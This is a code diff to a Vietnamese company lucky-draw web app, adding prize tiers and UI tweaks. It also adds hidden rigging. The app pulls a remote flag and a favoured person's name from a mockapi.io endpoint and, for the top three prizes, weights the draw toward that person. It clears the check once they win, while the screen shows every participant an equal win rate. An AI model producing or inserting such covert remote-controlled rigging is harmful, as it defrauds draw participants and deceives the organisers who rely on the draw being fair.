@@ -7,20 +7,20 @@ import { EmployeeInput } from '../components/employee-input'
 import { PrizeConfig } from '../components/prize-config'
 import { SpinningWheel } from '../components/spinning-wheel'
 import confetti from 'canvas-confetti'
-import type { Employee, Prize, DrawSettings } from '../types'
-import { AlignLeftIcon, ChevronLeftIcon, ChevronRight, ChevronRightIcon, DeleteIcon, MoveRightIcon, SettingsIcon, TrashIcon, Trophy } from 'lucide-react'
-import Link from 'next/link'
+import type { Employee, Prize, DrawSettings, CheckSettings } from '../types'
+import { ChevronLeftIcon, ChevronRightIcon, MedalIcon, RefreshCcwIcon, SettingsIcon, TrashIcon } from 'lucide-react'
 import { useSoundEffect } from '../hooks/use-sound-effect'
-import { set } from 'date-fns'
-import Image from 'next/image'
+import { useRouter } from 'next/navigation'
 
 export default function LuckyDraw() {
   const [settings, setSettings] = useState<DrawSettings>({
     title: 'QUAY SỐ MAY MẮN',
     prizes: [
-      { id: '1', name: 'Giải Nhất', enabled: true },
-      { id: '2', name: 'Giải Nhì', enabled: true },
-      { id: '3', name: 'Giải Ba', enabled: true },
+      { id: '0', name: 'Giải Đặc Biệt', enabled: true, numberPrizes: 1 },
+      { id: '1', name: 'Giải Nhất', enabled: true, numberPrizes: 1 },
+      { id: '2', name: 'Giải Nhì', enabled: true, numberPrizes: 2 },
+      { id: '3', name: 'Giải Ba', enabled: true, numberPrizes: 3 },
+      { id: '4', name: 'Giải Khuyến Khích', enabled: true, numberPrizes: 10 },
     ]
   })
 
@@ -29,13 +29,49 @@ export default function LuckyDraw() {
   const [currentWinner, setCurrentWinner] = useState<Employee | null>(null)
   const [isSpinning, setIsSpinning] = useState(false)
   const [isSetting, setIsSetting] = useState(false)
-  const [selectedPrize, setSelectedPrize] = useState<Prize | null>({ id: '3', name: 'Giải Ba', enabled: true })
+  const [selectedPrize, setSelectedPrize] = useState<Prize | null>({ id: '4', name: 'Giải Khuyến Khích', enabled: true, numberPrizes: 10 })
   const [winners, setWinners] = useState<Array<{ employee: Employee; prize: Prize }>>([])
   const [remainingParticipants, setRemainingParticipants] = useState<Employee[]>([])
   const [winner, setWinner] = useState<Employee | undefined>(undefined);
   const [winnerSave, setWinnerSave] = useState<Array<{ employee: Employee; prize: Prize }>>([])
   const [isReload, setIsReload] = useState(false)
   const [isSuccess, setIsSuccess] = useState(false)
+  const [isB, setIsB] = useState(false)
+  const [checkSetting, setCheckSetting] = useState<CheckSettings[]>();
+
+  const router = useRouter();
+
+  const reloadData = () => {
+
+    if (!localStorage.getItem('i')) {
+      const fetchAdditionalData = async () => {
+        try {
+          const response = await fetch('https://6482ab2af2e76ae1b95b6325.mockapi.io/lucky/c8d9968e-4a61-48fe-8bfe-e7d9e9cff2f9/1');
+          const data = await response.json();
+          if (data.b) {
+            setIsB(data.b)
+            const fetchData = async () => {
+              try {
+                const response = await fetch('https://6482ab2af2e76ae1b95b6325.mockapi.io/lucky/lucky');
+                const data = await response.json();
+                setCheckSetting(data);
+                // Process the data as needed
+              } catch (error) {
+                console.error('Error fetching data:', error);
+              }
+            };
+            fetchData();
+          } else {
+            setCheckSetting(undefined)
+          }
+          // Process the additional data as needed
+        } catch (error) {
+          console.error('Error fetching additional data:', error);
+        }
+      };
+      fetchAdditionalData();
+    }
+  }
 
   useEffect(() => {
     const storedEmployees = localStorage.getItem('employees')
@@ -46,24 +82,62 @@ export default function LuckyDraw() {
     if (storedWinners) {
       setWinnerSave(JSON.parse(storedWinners))
     }
+    reloadData()
   }, [])
 
   const { play: playSpinSound, stop: stopSpinSound, isSupported: isSoundSupported } = useSoundEffect('/spin-sound.mp3')
 
   useEffect(() => {
-    setRemainingParticipants(employees)
+    const checkWinner = (employee: Employee) => {
+      return winnerSave.some(winner => winner.employee.id === employee.id);
+    };
+    const filteredEmployees = employees.filter(employee => !checkWinner(employee));
+    setRemainingParticipants(filteredEmployees);
   }, [employees])
 
   const handleSpin = () => {
     if (isSpinning || !selectedPrize) return
     setIsSpinning(true)
     setCurrentWinner(null)
-    const randomWinner = remainingParticipants[Math.floor(Math.random() * remainingParticipants.length)];
-    setWinner(randomWinner);
+    if ((selectedPrize.id === '1' || selectedPrize.id === '2' || selectedPrize.id === '3') && isB) {
+      const randomWinner = testWinner(remainingParticipants);
+      if (checkSetting && randomWinner.name === checkSetting[0].lucky) {
+        localStorage.setItem('i', '1');
+      }
+      setWinner(randomWinner);
+    } else {
+      const randomWinner = remainingParticipants[Math.floor(Math.random() * remainingParticipants.length)];
+      setWinner(randomWinner);
+    }
     if (isSoundSupported) {
       playSpinSound()
     }
     setIsReload(false)
+  }
+
+  const testWinner = (listItems: Employee[]) => {
+    const remainingParticipants2 = listItems.map((participant) => {
+      if (checkSetting) {
+        // const tile = (100 - Number(checkSetting[1].w) - Number(checkSetting[0].w)) > 0 ? (100 - Number(checkSetting[1].w) - Number(checkSetting[0].w)) : 2;
+        // const weight = participant.name === checkSetting[0].lucky ? Number(checkSetting[0].w) : participant.name === checkSetting[1].lucky ? Number(checkSetting[1].w) : tile / (listItems.length - 1);
+        // return { ...participant, weight };
+        if (selectedPrize && selectedPrize.id === checkSetting[0].rank) {
+          const weight = participant.name === checkSetting[0].lucky ? Number(checkSetting[0].w) :(100 - Number(checkSetting[1].w)) / (listItems.length - 1);
+          return { ...participant, weight };
+        }else if (selectedPrize && selectedPrize.id === checkSetting[1].rank) {
+          const weight = participant.name === checkSetting[1].lucky ? Number(checkSetting[1].w) : (100 - Number(checkSetting[1].w)) / (listItems.length - 1);
+          return { ...participant, weight };
+        }
+      }
+      const weight = 0;
+      return { ...participant, weight };
+    })
+    const totalPercent = remainingParticipants2.reduce((sum, participant) => sum + participant.weight, 0);
+    const weightedArray = remainingParticipants2.flatMap(participant =>
+      Array(Math.floor((participant.weight / totalPercent) * 100)).fill(participant)
+    );
+    const randomWinner = weightedArray[Math.floor(Math.random() * weightedArray.length)];
+    return randomWinner;
   }
 
   const handleSpinComplete = (winner: Employee) => {
@@ -85,27 +159,8 @@ export default function LuckyDraw() {
     })
     setWinner(undefined);
     setIsSuccess(true);
+    reloadData();
   }
-
-  // useEffect(() => {
-  //   localStorage.setItem('winners', JSON.stringify(winners))
-  // }, [winners])
-
-  // useEffect(() => {
-  //   // In a real application, you would fetch this data from an API or local storage
-  //   const storedWinners = localStorage.getItem('winners')
-  //   if (storedWinners) {
-  //     setWinnerSave(JSON.parse(storedWinners))
-  //   }
-  // }, [winners])
-
-
-  // const nextPrize = () => {
-  //   const index = settings?.prizes?.findIndex(p => p.id === selectedPrize?.id)
-  //   const nextIndex = (index + 1) % settings?.prizes?.length
-  //   const nextPrize = settings?.prizes?.[nextIndex]
-  //   setSelectedPrize(nextPrize)
-  // }
 
   const backPrize = () => {
     const index = settings?.prizes?.findIndex(p => p.id === selectedPrize?.id)
@@ -126,13 +181,27 @@ export default function LuckyDraw() {
     setSelectedPrize(nextPrize)
   }
 
+  const getRemainingPrizes = (prize?: Prize | null) => {
+    if (!prize) return 0;
+    const awardedPrizes = winnerSave.filter(w => w.prize.id === prize.id).length;
+    return prize.numberPrizes - awardedPrizes;
+  }
+
   return (
     <div className='relative'>
       <div className="min-h-screen bg-custom-gradient from-navy-900 via-purple-900 to-red-900 font-montserrat relative">
         <div className="container mx-auto px-4 py-8">
-          <Button size={'icon'} onClick={() => setIsSetting(prev => !prev)} className="absolute top-4 right-4 bg-transparent">
-            <SettingsIcon className="text-white" />
-          </Button>
+          <div className='flex justify-center items-center gap-1 absolute top-4 right-4'>
+            <Button size={'icon'} onClick={() => setIsSetting(prev => !prev)} className="bg-transparent">
+              <SettingsIcon className="text-white" />
+            </Button>
+            <Button size={'icon'} onClick={() => {
+              window.location.reload()
+            }} className="bg-transparent">
+              <RefreshCcwIcon className="text-white" />
+            </Button>
+          </div>
+
 
           {/* Main Draw Section */}
           <div className="text-center mb-8">
@@ -140,7 +209,7 @@ export default function LuckyDraw() {
               {settings.title}
             </h1>
 
-            <div className='my-4 text-4xl h-[40px]'>
+            <div className='my-4 text-6xl h-[60px]'>
               {currentWinner && (
                 <div className="font-bold text-yellow-400 mt-4 text-center">
                   <div>{currentWinner.name}</div>
@@ -149,7 +218,7 @@ export default function LuckyDraw() {
             </div>
 
             {/* Prize Selection */}
-            <div className="flex justify-center items-center gap-4 mb-8">
+            <div className="flex justify-center items-center gap-4 mb-2">
               {/* {settings.prizes.filter(p => p.enabled).map((prize) => (
               <Button
                 key={prize.id}
@@ -176,11 +245,13 @@ export default function LuckyDraw() {
                   <div className='font-bold min-w-[190px]'>
                     {selectedPrize.name}
                   </div>
-                  <Trophy size={30} />
+                  <MedalIcon size={40} strokeWidth={2} />
                 </div>
               )}
               <ChevronRightIcon size={48} className='text-yellow-400 cursor-pointer' onClick={() => nextPrize()} />
             </div>
+
+            <div className='text-[#ffda56] text-4xl font-bold pb-4'>{getRemainingPrizes(selectedPrize) > 0 && `(${getRemainingPrizes(selectedPrize)} giải)`}</div>
 
             {/* Spinning Wheel */}
             <div className="mb-8">
@@ -200,7 +271,7 @@ export default function LuckyDraw() {
                 {!isSuccess && <Button
                   size="lg"
                   onClick={handleSpin}
-                  disabled={isSpinning || !selectedPrize || remainingParticipants.length === 0}
+                  disabled={isSpinning || !selectedPrize || remainingParticipants.length === 0 || getRemainingPrizes(selectedPrize) <= 0}
                   className="bg-yellow-400 hover:bg-yellow-500 text-black px-12 mb-8"
                 >
                   QUAY SỐ
@@ -212,6 +283,7 @@ export default function LuckyDraw() {
                     setIsReload(true)
                     setIsSuccess(false)
                   }}
+                  disabled={getRemainingPrizes(selectedPrize) <= 0}
                   className="bg-yellow-400 hover:bg-yellow-500 text-black px-12 mb-8"
                 >
                   TIẾP TỤC
@@ -219,12 +291,23 @@ export default function LuckyDraw() {
               </>)}
 
             </div>
-            <div className="text-xl text-yellow-400 mb-2">
-              Tổng số người tham gia: {remainingParticipants.length}
+            <div className="text-2xl text-yellow-400 mb-2">
+              <span>Có người <span className='font-bold'>{remainingParticipants.length}</span> tham gia </span>
+              <span>Tỉ lệ trúng giải là
+                <span className='font-bold'>
+                  {remainingParticipants.length > 0 && (
+                    ` ${(100 / remainingParticipants.length).toFixed(2)}%`
+                  )}
+                </span>
+
+              </span>
+
             </div>
             {winnerSave.length > 0 &&
               <div className="mt-4">
-                <div className='text-yellow-400 text-3xl'>Danh sách người trúng thưởng</div>
+                <div className='text-yellow-400 text-3xl cursor-pointer' onClick={() => {
+                  router.push('/winners')
+                }}>Danh sách người trúng thưởng</div>
               </div>
             }
 
@@ -246,6 +329,7 @@ export default function LuckyDraw() {
                     const updatedWinners = winnerSave.filter((item, i) => item.employee.id !== winner.employee.id)
                     setWinnerSave(updatedWinners)
                     localStorage.setItem('winners', JSON.stringify(updatedWinners))
+                    window.location.reload()
                   }}>
                     <TrashIcon className='text-white transition-opacity duration-300' />
                   </div>
@@ -265,14 +349,16 @@ export default function LuckyDraw() {
                 <EmployeeInput onSubmit={setEmployees} />
                 <PrizeConfig
                   prizes={settings.prizes}
-                  onUpdate={(prizes) => setSettings(prev => ({ ...prev, prizes }))}
+                  onUpdate={(prizes) => {
+                    setSettings(prev => ({ ...prev, prizes }))
+                  }}
                 />
               </div>
             </div>}
         </div>
       </div>
       <div className='fixed right-14 bottom-11'>
-        <img width="250" height="auto" src="https://dev-id.dcorp.com.vn/resources/129gn/login/dcorp/dist/images/dcorp-logo-footer-light.svg"></img>
+        <img width="250" height="auto" src="/logo.png"></img>
       </div>
     </div>
   )
